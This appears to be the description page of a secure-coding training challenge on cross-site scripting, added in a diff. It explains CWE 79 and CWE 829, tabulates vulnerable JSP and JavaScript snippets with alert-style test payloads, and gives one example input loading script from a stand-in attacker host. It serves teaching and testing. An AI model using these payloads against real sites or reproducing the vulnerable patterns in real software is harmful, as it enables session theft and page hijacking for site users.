@@ -1,0 +1,93 @@
+<p>
+    The purpose of this challenge is to demonstrate the MITRE Top 25 programming flaw: 
+    "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')".
+<br><br>
+
+  <blockquote>
+         <i>The software does not neutralize or incorrectly neutralizes user-controllable input before
+              it is placed in output that is used as a web page that is served to other users.</i>
+    <footer>From MITRE <a target="_blank" href="https://cwe.mitre.org/data/definitions/79.html">CWE 79</a></footer>
+  </blockquote>
+  <p>Another Top 25 flaw that is related to XSS is "Inclusion of Functionality from Untrusted Control Sphere". 
+      This particular weakness refers to including potentially malicious 3rd party widgets(which are script includes) into a web application.</p>
+  <blockquote>
+         <i>When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively 
+             trust that functionality. Without sufficient protection mechanisms, the functionality
+              could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). </i>
+    <footer>From MITRE <a target="_blank" href="https://cwe.mitre.org/data/definitions/829.html">CWE 829</a></footer>
+  </blockquote>
+  <br>
+  <h4>A Bit About XSS</h4>
+  <p>
+    Web applications have become extremely widespread due to their portability and ease of use. 
+    At the same time Cross-Site Scripting (XSS) has become one of the most common security bugs found in software.
+  </p>
+<p>
+The main impact of XSS is that it allows attackers to alter the functionality of the web application. This is possible because attackers can inject JavaScript into the page. 
+A common technique is to inject a JavaScript include to a site the attacker controls. Then they can write large scripts, even JavaScript keyloggers have been written.
+
+Example malicious input:<code>&lt;script src="https://evil.bad/attack.js"&gt;&lt;/script&gt;</code>
+The same concept applies to "Inclusion of Functionality from Untrusted Control Sphere".
+</p>
+<p>
+XSS is relatively easy to find by novice testers while at the same time can be very hard to prevent. There are many areas in a page that need to be protected and many different type of payloads depending on each area.
+</p>
+<p>
+    Here's just a few.
+<table class="table table-sm">
+    <thead>
+        <tr>
+            <th>Page context</th>
+            <th>Vulnerable code</th>
+            <th>Test payload for 'userName'</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>Inside html tags</td>
+            <td><pre>&lt;h1&gt;Welcome &lt;%=request.getParameter("userName");%&gt;!&lt;/h1&gt;</pre></td>
+            <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+        </tr>
+        <tr>
+            <td>Inside html attributes</td>
+            <td><pre>&lt;img src=&quot;/p/u/14/avtr.png&quot; title=&apos;Avatar for user &lt;%=request.getParameter(&quot;userName&quot;);%&gt;&apos;&gt;</pre></td>
+            <td><code>' onload='alert(1)' x='</code></td>
+        </tr>
+        <tr>
+            <td>Inside JavaScript code</td>
+            <td><pre>document.cookie="username=&lt;%=request.getParameter(&apos;userName);%&gt;"</pre></td>
+            <td><code>";alert(1);x="</code></td>
+        </tr>
+        <tr>
+            <td>During dynamic DOM updates <small>- like in the case of an Ajax callback</small></td>
+            <td><pre>message.innerHTML="Hello "+response.data.userName+"!"</pre></td>
+            <td><code>&lt;img src=bla onerror=alert(1)&gt;</code></td>
+        </tr>
+    </tbody>
+</table>
+For a list of many other XSS payloads visit: <a target="_blank" href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">The OWASP XSS Filter Evasion Cheat Sheet</a>
+</p>
+<br>
+<h4>About the Challenge</h4> 
+<p>The developers of the application implemented a social networking feature where users can see each others profiles. This is a nice looking Rich UI widget based on Bootstrap and JQuery.
+    Users have the ability to preview how their profile looks to others.
+</p>
+<p>
+    Obviously there's XSS in this newly introduced feature. You won't have to do anything nefarious, like stealing credentials, to pass the challenge. 
+    <br>Simply produce a JavaScript alert that says 
+    <code>FIRE!</code> <small>- including exclamation mark</small>. Every time a user sees your profile they should see the <code>FIRE!</code> message. 
+    You can have fun with the page and pop-up all kind of messages if you'd like, but when you're ready, pop-up <code>FIRE!</code> and you can get your code.
+</p>
+<p>
+Note: Due to complexities associated with executing JavaScript on the server side, the validation for the challenge is a regular expression so if you encounter any false positives/negatives, please excuse the organizers. 
+</p>
+<h5>Tips for completing the challenge</h5>
+<p>
+<ul>
+    <li>It is not enough to insert HTML markup in the page. You need to see the actual javascript pop-up.</li>
+    <li>Use view source to look at the javascript code in the page. See if you can spot an issue there.</li>
+    <li>Leverage the payloads on this page. See if any of them pops.</li>
+</ul>
+</p>
+<p><strong>PS:</strong> The challenge is inspired from the real life story of the <a target="_blank" href="https://en.wikipedia.org/wiki/Samy_(computer_worm)">Samy</a> worm, the fastest spreading virus of all time. </p>
+<br>
